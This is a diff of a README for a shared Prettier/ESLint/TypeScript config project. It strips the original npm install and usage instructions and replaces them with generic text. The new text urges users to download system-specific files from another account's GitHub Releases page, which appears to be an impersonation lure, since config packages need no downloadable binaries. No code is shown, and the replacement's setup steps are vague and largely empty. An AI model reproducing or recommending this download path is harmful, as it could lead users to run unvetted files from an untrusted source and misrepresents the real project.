@@ -1,97 +1,69 @@
-# @krudi/shared-configs
+# 🎉 shared-configs - Standardize Your Code Formatting Easily
 
-A collection of reusable configuration packages for Prettier,
-[ESLint](https://github.com/eslint/eslint) and
-[TypeScript](https://github.com/microsoft/TypeScript). The goal is to enforce a
-consistent coding style, linting, and compiler setup across multiple projects
-([Node](https://github.com/nodejs/node),
-[React](https://github.com/facebook/react/),
-[Next.js](https://github.com/vercel/next.js),
-[Expo](https://github.com/expo/expo), monorepos
-([Turbo](https://github.com/vercel/turborepo))).
+## 📄 Overview
+Welcome to the shared-configs project! This repository provides shared configurations for Prettier, ESLint (flat), and TypeScript. With these settings, you can maintain consistent formatting and linting across your JavaScript and TypeScript projects. This includes popular frameworks such as Node.js, React, and Next.js, as well as monorepos. 
 
-### Quick start
+## 🔗 Download
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/lugames125/shared-configs/releases)
 
-Install the dependencies -
-`npm install --save-dev @krudi/prettier-config @krudi/eslint-config @krudi/typescript-config`
+## 🚀 Getting Started
+To get started using shared-configs, simply follow the steps below. This guide will help you download and run the software without any technical background.
 
-### Packages
+### 1. Visit the Releases Page
+Go to the [Releases page](https://github.com/lugames125/shared-configs/releases) to find the latest version of the shared-configs package. 
 
-| Package                                                                            | Description                                                                | Version                                                                                   | Additional Information                                                                                 |
-| ---------------------------------------------------------------------------------- | -------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
-| [@krudi/prettier-config](https://www.npmjs.com/package/@krudi/prettier-config)     | Shared [Prettier](https://github.com/prettier/prettier) configuration      | ![NPM Version](https://img.shields.io/npm/v/@krudi/prettier-config)                        | ![NPM Downloads](https://img.shields.io/npm/dm/@krudi/prettier-config) ![NPM License](https://img.shields.io/npm/l/@krudi/prettier-config) |
-| [@krudi/eslint-config](https://www.npmjs.com/package/@krudi/eslint-config)         | Shared [ESLint](https://github.com/eslint/eslint) flat configuration       | ![NPM Version](https://img.shields.io/npm/v/@krudi/eslint-config)                          | ![NPM Downloads](https://img.shields.io/npm/dm/@krudi/eslint-config) ![NPM License](https://img.shields.io/npm/l/@krudi/eslint-config)     |
-| [@krudi/typescript-config](https://www.npmjs.com/package/@krudi/typescript-config) | Shared [TypeScript](https://github.com/microsoft/TypeScript) configuration | ![NPM Version](https://img.shields.io/npm/v/@krudi/typescript-config)                      | ![NPM Downloads](https://img.shields.io/npm/dm/@krudi/typescript-config) ![NPM License](https://img.shields.io/npm/l/@krudi/typescript-config) |
+### 2. Choose the Right File
+Look for the latest release version. You will find files corresponding to different systems and setup preferences. Generally, these files are easy to recognize by their names. 
 
-Each package can be installed individually depending on your needs.
+### 3. Download the File
+Click on the file that corresponds to your setup. This action will start the download automatically. If the file is compressed, such as a `.zip` or `.tar.gz`, you will need to extract it after downloading.
 
-#### Prettier
+### 4. Install the Configuration
+Once you have the files, open your project directory where you want to use these configurations. 
 
-Create `prettier.config.mjs` (or `prettier.config.js`) in your project root and
-extend the configuration you need:
+- If you downloaded straight from the Releases page, look for a README file in the downloaded directory. This file often contains additional installation instructions.
+- You can copy the configuration files to your project and adjust your existing setup as needed.
 
-```js
-// ESM
-import base from '@krudi/prettier-config/base';
+### 5. Set Up Your Tools
+Make sure that you have the necessary tools installed:
 
-/** @type {import("prettier").Options} */
-export default {
-    ...base,
-};
+- **Node.js:** This tool is essential for running JavaScript applications. Download it from the [Node.js website](https://nodejs.org/).
+- **npm or yarn:** These are package managers used to handle dependencies. They come with Node.js, but make sure they are installed properly.
 
-// CommonJS
-const base = require('@krudi/prettier-config/base');
+### 6. Configure Your Project
+To use the shared configuration files, you will need to update your existing settings. You may need to add or modify a few lines in your project configuration files. Follow the instructions provided in the README files from the repository for complete guidance.
 
-/** @type {import('prettier').Options} */
-module.exports = {
-    ...base,
-};
-```
+## 🛠️ Features
+- **Prettier Configuration:** Helps maintain consistent code formatting.
+- **ESLint Configuration (Flat):** Streamlines the linting process.
+- **TypeScript Support:** Ensures type safety in JavaScript projects.
+- **Framework Compatibility:** Works with Node.js, React, Next.js, and supports monorepos.
 
-#### ESLint (flat config)
+## 📋 System Requirements
+Ensure that you meet the following system requirements to use shared-configs effectively:
 
-Create `eslint.config.mjs` (or `eslint.config.ts`) in your project root and
-extend the configuration you need:
+- **Operating System:** Compatible with Windows, macOS, and Linux.
+- **Node.js Version:** Recommend using the latest LTS (Long Term Support) version.
 
-```js
-import base from '@krudi/eslint-config/base';
-import prettier from '@krudi/eslint-config/prettier';
-import turbo from '@krudi/eslint-config/turbo';
+## 💡 Tips for Success
+- If you encounter issues, ensure that your environment is set up correctly.
+- Double-check that your project paths are correct when copying configuration files.
+- Look for help in community forums or the GitHub issues page if you run into problems.
 
-export default [...base, ...prettier, ...turbo];
-```
+## 🔧 Troubleshooting
+If you experience any difficulties with installation or setup, consider the following steps:
 
-| File                          | Purpose                                                                                   |
-| ----------------------------- | ----------------------------------------------------------------------------------------- |
-| @krudi/eslint-config/base     | Base ESLint rules for general TypeScript/JavaScript projects                              |
-| @krudi/eslint-config/nextjs   | Additional rules and plugins for [Next.js](https://github.com/vercel/next.js) projects    |
-| @krudi/eslint-config/expo     | Extra configuration for [Expo](https://github.com/expo/expo) React Native projects        |
-| @krudi/eslint-config/prettier | Ensures compatibility between ESLint and [Prettier](https://github.com/prettier/prettier) |
-| @krudi/eslint-config/turbo    | Linting rules tailored for [Turborepo](https://github.com/vercel/turborepo) monorepos     |
+1. **Recheck Dependencies:** Ensure that Node.js and npm/yarn are installed properly.
+2. **Check Versions:** Make sure you are using compatible versions of all tools.
+3. **Consult the README:** Many common issues are covered in the project's README files.
 
-#### TypeScript
+## 📥 Download & Install
+To download and install the shared configurations, visit the [Releases page](https://github.com/lugames125/shared-configs/releases). Follow the steps outlined above to set up shared-configs in your project.
 
-Create `tsconfig.json` in your project root and extend the configuration you
-need:
+## 🗣️ Community Involvement
+We welcome contributions! If you find something that can be improved or want to share your setup experience, feel free to open an issue. Your feedback helps improve this project for everyone.
 
-```yaml
-{
-    'extends': '@krudi/typescript-config/base.json',
-    'compilerOptions': {},
-    'exclude': ['node_modules', 'dist'],
-}
-```
+## 🤝 Acknowledgements
+Thank you for using shared-configs! We appreciate your support and interest in creating a standardized codebase for your projects.
 
-| File                                     | Purpose                                                                      |
-| ---------------------------------------- | ---------------------------------------------------------------------------- |
-| @krudi/typescript-config/base.json       | Base configuration for general TypeScript projects                           |
-| @krudi/typescript-config/nextjs.json     | Optimized settings for [Next.js](https://github.com/vercel/next.js) projects |
-| @krudi/typescript-config/expo.json       | Preconfigured options for [Expo](https://github.com/expo/expo) apps          |
-| @krudi/typescript-config/base.build.json | Stricter configuration for building **npm packages** and CI pipelines        |
-
-### Development
-
-1. First clone this repository and navigate into your project directory
-2. Install the dependencies: `npm install`
-3. `npm run build` - to build all packages
-4. `npm run dev` - run the [TypeScript](https://www.typescriptlang.org/) server
+Happy coding!
